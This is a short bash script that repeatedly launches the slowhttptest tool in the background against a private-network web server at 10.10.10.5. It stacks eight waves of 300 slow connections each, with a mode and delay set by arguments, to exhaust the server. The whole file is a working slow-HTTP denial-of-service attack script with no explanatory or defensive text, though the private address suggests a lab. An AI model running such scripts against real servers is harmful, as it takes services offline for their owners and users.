#/bin/bash

slowhttptest -c 300 -$2 -g -l 150 -r 30 -u http://10.10.10.5 &
sleep $1
slowhttptest -c 300 -$2 -g -l 150 -r 30 -u http://10.10.10.5 &
sleep $1
slowhttptest -c 300 -$2 -g -l 150 -r 30 -u http://10.10.10.5 &
sleep $1
slowhttptest -c 300 -$2 -g -l 150 -r 30 -u http://10.10.10.5 &
sleep $1
slowhttptest -c 300 -$2 -g -l 150 -r 30 -u http://10.10.10.5 &
sleep $1
slowhttptest -c 300 -$2 -g -l 150 -r 30 -u http://10.10.10.5 &
sleep $1
slowhttptest -c 300 -$2 -g -l 150 -r 30 -u http://10.10.10.5 &
sleep $1
slowhttptest -c 300 -$2 -g -l 150 -r 30 -u http://10.10.10.5 &
